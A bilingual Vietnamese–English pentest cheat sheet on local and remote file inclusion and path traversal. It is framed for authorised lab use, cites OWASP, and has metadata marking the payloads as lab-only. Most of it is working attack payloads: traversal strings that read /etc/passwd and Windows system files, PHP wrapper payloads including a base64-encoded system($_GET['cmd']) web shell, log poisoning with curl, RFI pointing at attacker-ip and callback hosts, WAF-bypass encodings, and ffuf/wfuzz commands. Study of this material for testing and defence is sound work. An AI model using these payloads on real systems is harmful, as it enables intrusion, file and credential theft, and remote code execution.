# 5. LFI/RFI + Path Traversal

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

LFI/RFI + Path Traversal xảy ra khi ứng dụng nhận đầu vào là tên đường dẫn tệp tin và thực hiện đọc/thực thi tệp tin đó mà không qua kiểm duyệt, cho phép đọc tệp hệ thống hoặc thực thi mã từ xa.

### 5.1. Basic Path Traversal / LFI
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng sử dụng các tham số trong URL hoặc POST body để chỉ định tên tệp tin cần đọc, tải hoặc bao gồm (như `file=`, `page=`, `doc=`).
    *   *English*: Identified by parameters specifying filenames or paths in requests (such as `file=`, `page=`, `doc=`), returning system file structures or static resources.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử nghiệm gửi các chuỗi điều hướng thư mục như `../` hoặc `..\` cùng tên tệp mặc định của hệ thống để xem ứng dụng có trả về nội dung tệp đó không.
    *   *English*: Input directory traversal sequences like `../` or `..\` combined with default system filenames and analyze response text.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-05-001 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.1. Basic Path Traversal / LFI -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable include reads the mounted synthetic marker outside the public directory; the allowlist/containment control returns 404 without opening it -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
../../../../tmp/sechub-lab/fixture.txt               # Synthetic fixture file lookup
../../../../etc/hosts                                # Linux network hostname lookup
../../../../etc/issue                                # Linux OS release information lookup
../../../../etc/resolv.conf                          # Linux DNS resolver configuration lookup
..\..\..\..\windows\win.ini                           # Windows system initialization configuration
..\..\..\..\windows\system32\drivers\etc\hosts       # Windows network hostname lookup
/tmp/sechub-lab/fixture.txt                          # Absolute synthetic fixture lookup
C:\windows\win.ini                                   # Absolute path file lookup on Windows
/tmp/sechub-lab/process-cmdline.txt                  # Synthetic process-metadata fixture
....//....//....//tmp/sechub-lab/fixture.txt         # Nested traversal toward a synthetic fixture
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ffuf hoặc wfuzz để quét tự động các tham số và đường dẫn LFI bằng danh sách từ khóa LFI-Jhaddix.
    *   *English*: Use ffuf or wfuzz to automate scanning for LFI parameters and traversal paths using the LFI-Jhaddix list.
<!-- payload-id: CHEAT-05-002 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.1. Basic Path Traversal / LFI -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable include reads the mounted synthetic marker outside the public directory; the allowlist/containment control returns 404 without opening it; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    ffuf -u 'http://victim.lab.test/index.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <normal_size>
    ```


---

### 5.2. PHP Wrappers
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng chạy trên nền tảng PHP và hỗ trợ cơ chế nạp tệp tin thông qua các wrapper tích hợp sẵn.
    *   *English*: The web server is powered by PHP and accepts input streams routed to standard integrated wrappers.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử chèn `php://filter/convert.base64-encode/resource=index.php` để lấy mã nguồn dưới dạng Base64 mà không thực thi.
    *   *English*: Try passing wrappers such as `php://filter` to dump source code as Base64.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-05-003 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.2. PHP Wrappers -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: only the enabled PHP wrapper returns the synthetic source marker in the disposable fixture; the fixed allowlist rejects wrapper schemes -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
php://filter/convert.base64-encode/resource=index.php # Base64 encode filter read to bypass execution
php://filter/read=string.rot13/resource=index.php     # ROT13 filter read bypass
php://input                                           # POST data input wrapper (requires allow_url_include=On)
data://text/plain,<?php echo 'SECHUB_INCLUDE_MARKER'; ?> # Inert PHP marker (requires allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= # Base64 dynamic PHP execution wrapper
zip://uploads/avatar.zip%23shell.php                  # Executes shell.php stored inside uploaded ZIP archive (Note: URL fragment # must be URL-encoded to %23)
phar://uploads/avatar.png/shell.php                   # Executes shell.php stored inside PHAR format archive
php://filter/read=string.toupper/resource=config.php  # Uppercase conversion wrapper test
php://filter/zlib.deflate/convert.base64-encode/resource=config.php # Compressed and base64-encoded source read
php://filter/read=convert.base64-encode/resource=/tmp/sechub-lab/fixture.txt # Base64 read of synthetic fixture
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ffuf để fuzzing các wrapper PHP và trích xuất mã nguồn tự động.
    *   *English*: Use ffuf to fuzz dynamic PHP wrappers and automate source code extraction.
<!-- payload-id: CHEAT-05-004 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.2. PHP Wrappers -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the enabled PHP wrapper returns the synthetic source marker in the disposable fixture; the fixed allowlist rejects wrapper schemes; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    ffuf -u 'http://victim.lab.test/index.php?file=FUZZ' -w php_wrappers_list.txt -fs <normal_size>
    ```


---

### 5.3. Log Poisoning
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Đã phát hiện lỗ hổng LFI và máy chủ lưu trữ log file (như Apache/Nginx access log) ở vị trí có thể đọc được.
    *   *English*: A path traversal vulnerability is confirmed, and server log files are hosted in readable directories.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Truy cập các đường dẫn log mặc định như `/var/log/apache2/access.log` và kiểm tra xem thông tin User-Agent của bạn có hiển thị trong đó không.
    *   *English*: Attempt to read known logs (e.g. `/var/log/nginx/access.log`) and verify if request details reflect on page.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-05-005 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.3. Log Poisoning -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable PHP fixture evaluates only the injected harmless marker from its synthetic access log; the fixed deployment stores logs outside executable include paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
/tmp/sechub-lab/apache-access.log                    # Synthetic Apache-format log
/tmp/sechub-lab/nginx-access.log                     # Synthetic Nginx-format log
/tmp/sechub-lab/auth.log                             # Synthetic auth-log fixture
/tmp/sechub-lab/mail.log                             # Synthetic mail-log fixture
/tmp/sechub-lab/sessions/sess_<session_id>           # Synthetic PHP-session fixture
/tmp/sess_<session_id>                               # Alternate PHP session storage path on Linux
/tmp/sechub-lab/process-environ.txt                  # Synthetic environment fixture
/tmp/sechub-lab/stdin.txt                            # Synthetic stdin fixture
C:\sechub-lab\iis-access.log                         # Synthetic IIS-format log
/tmp/sechub-lab/access.log?marker=<?php echo 'SECHUB_LOG_MARKER'; ?> # Inert log marker in synthetic fixture
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng curl để gửi mã khai thác PHP vào User-Agent header để đầu độc log, sau đó gọi lại qua LFI.
    *   *English*: Use curl to inject a PHP shell code into the User-Agent header to poison logs, then reference it using LFI.
<!-- payload-id: CHEAT-05-006 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.3. Log Poisoning -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable PHP fixture evaluates only the injected harmless marker from its synthetic access log; the fixed deployment stores logs outside executable include paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    curl -s -A "<?php echo 'SECHUB_LOG_MARKER'; ?>" "http://victim.lab.test/index.php"
    curl -s "http://victim.lab.test/index.php?file=/var/log/apache2/access.log&cmd=id"
    ```


---

### 5.4. Remote File Inclusion (RFI)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng chấp nhận một URL đầy đủ làm tham số tải file và nạp nó vào tiến trình thực thi.
    *   *English*: Present when the application permits full external URLs in file loading parameters and runs them.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập địa chỉ của một máy chủ bên ngoài (ví dụ: `http://callback.lab.test/shell.txt`) để xem máy chủ mục tiêu có tải file đó về không.
    *   *English*: Input an external domain or IP hosting a test file and check if target server performs outgoing request.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-05-007 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.4. Remote File Inclusion (RFI) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable fixture fetches only callback.lab.test and emits its marker; the fixed PHP configuration/allowlist refuses remote schemes -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
http://callback.lab.test/shell.txt                        # Simple HTTP remote file inclusion
https://callback.lab.test/shell.txt                       # Secure HTTPS remote file inclusion
ftp://callback.lab.test/shell.txt                         # FTP protocol remote file inclusion
\\attacker-ip\share\shell.php                        # SMB share file inclusion (works on Windows even with allow_url_include=Off)
http://callback.lab.test/shell                            # File inclusion omitting extension
http://callback.lab.test/shell.txt?                       # Query parameter append bypass
http://callback.lab.test/shell.txt#                       # URL fragment append bypass
http://callback.lab.test/                                 # Remote root file inclusion
http:/callback.lab.test/shell.txt                         # Single slash RFI bypass for simple filters
http://callback.lab.test/shell.txt?                       #  RFI bypass using trailing question mark to ignore extension-appending WAF checks.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng wfuzz để quét RFI bằng cách truyền danh sách tên miền kiểm thử bên ngoài.
    *   *English*: Use wfuzz to scan for RFI by inputting a wordlist of remote URLs.
<!-- payload-id: CHEAT-05-008 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.4. Remote File Inclusion (RFI) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable fixture fetches only callback.lab.test and emits its marker; the fixed PHP configuration/allowlist refuses remote schemes; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    wfuzz -c -z file,rfi_servers.txt 'http://victim.lab.test/index.php?file=FUZZ'
    ```


---

### 5.5. WAF Bypass (WAF Bypass Payload included)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi chèn các payload LFI cơ bản thì bị hệ thống trả về lỗi `403 Forbidden` hoặc `400 Bad Request` do bị tường lửa (WAF) ngăn chặn.
    *   *English*: Common traversal sequences are blocked by web application firewalls, returning `403` or `400` status codes.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử nghiệm các biến thể mã hóa (Double URL encode, Overlong UTF-8) hoặc lồng chuỗi (`....//`) để vượt qua bộ lọc.
    *   *English*: Test double URL encoding, overlong UTF-8, or nested path sequences to bypass input sanitizers.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-05-009 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.5. WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
..%252f..%252f..%252fetc/passwd                      # Double URL encoded traversal (bypasses single-decode filters)
..%c0%af..%c0%afetc/passwd                           # Overlong UTF-8 slash encoding
....//....//....//tmp/sechub-lab/fixture.txt         # Nested traversal to synthetic fixture
..%2f..%2f..%2fetc%2fpasswd                          # Basic URL encoded traversal
..%5c..%5c..%5cwindows/win.ini                       # Windows backslash URL encoded traversal
../../../../tmp/sechub-lab/fixture.txt%00            # Legacy-only null-byte case
../../../../tmp/sechub-lab/fixture.txt/./././        # Synthetic boundary case
?file=index.php&file=../../../../tmp/sechub-lab/fixture.txt # Duplicate-parameter parser case
/tmp/sechub-lab/fixture.txt/                         # Trailing slash synthetic case
php://filter/convert.base64-encode/resource=/tmp/sechub-lab/fixture.txt # Synthetic wrapper case
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Fuzzing với burp suite sử dụng danh sách LFI bypass của PayloadsAllTheThings.
    *   *English*: Fuzz parameters with Burp Suite using LFI bypass wordlists from PayloadAllTheThings.
<!-- payload-id: CHEAT-05-010 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.5. WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz for LFI bypasses using ffuf with double encoding and filter bypass payloads
    ffuf -u "http://victim.lab.test/index.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-bypasses.txt -fs <normal_response_size>
    # Curl command executing LFI bypass via double URL encoded path
    curl -s "http://victim.lab.test/index.php?file=..%252f..%252f..%252fetc%252fpasswd"
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP WSTG — Testing for File Inclusion. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion — bản hiện hành; truy cập: 2026-07-18.
